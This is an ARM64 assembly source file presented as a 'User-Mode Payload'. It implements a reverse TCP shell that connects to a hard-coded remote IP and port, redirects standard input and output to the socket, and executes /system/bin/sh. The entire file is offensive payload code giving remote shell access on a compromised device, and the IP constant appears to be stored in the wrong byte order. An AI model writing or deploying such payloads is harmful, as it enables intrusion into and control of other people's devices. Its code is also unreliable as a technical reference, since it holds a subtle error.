/*
 * reverse_tcp_shell.s - Establishes a minimal reverse TCP shell.
 *
 * Category: User‑Mode Payload
 *
 * This program creates a socket, connects to a hard-coded remote IP and port,
 * duplicates the socket for STDIN, STDOUT, and STDERR, and then executes /system/bin/sh.
 */
    .section .data
shell_path:
    .asciz "/system/bin/sh"
shell_argv:
    .quad shell_path
    .quad 0
remote_addr:
    .hword 2            // AF_INET.
    .hword 0x5c11       // Port 4444 (network order; adjust as needed).
    .word 0xC0A80164    // IP: 192.168.1.100.
    .word 0            // Padding.
    .section .text
    .global main
main:
    // Create socket: AF_INET (2), SOCK_STREAM (1), protocol 0.
    mov x0, 2
    mov x1, 1
    mov x2, 0
    mov x8, 198        // syscall: socket.
    svc 0
    mov x19, x0       // Save socket fd.
    // Connect to remote address.
    adr x1, remote_addr
    mov x2, #16       // Length of sockaddr_in.
    mov x0, x19
    mov x8, 203       // syscall: connect.
    svc 0
    // Duplicate socket fd to STDIN, STDOUT, STDERR.
    mov x3, #0
dup_loop:
    mov x0, x19
    mov x1, x3
    mov x2, #0
    mov x8, 24       // syscall: dup3.
    svc 0
    add x3, x3, #1
    cmp x3, #3
    blt dup_loop
    // Execute /system/bin/sh.
    adr x0, shell_path
    adr x1, shell_argv
    mov x2, #0
    mov x8, 221      // syscall: execve.
    svc 0
    // Exit if execve fails.
    mov x0, 1
    mov x8, 93
    svc 0
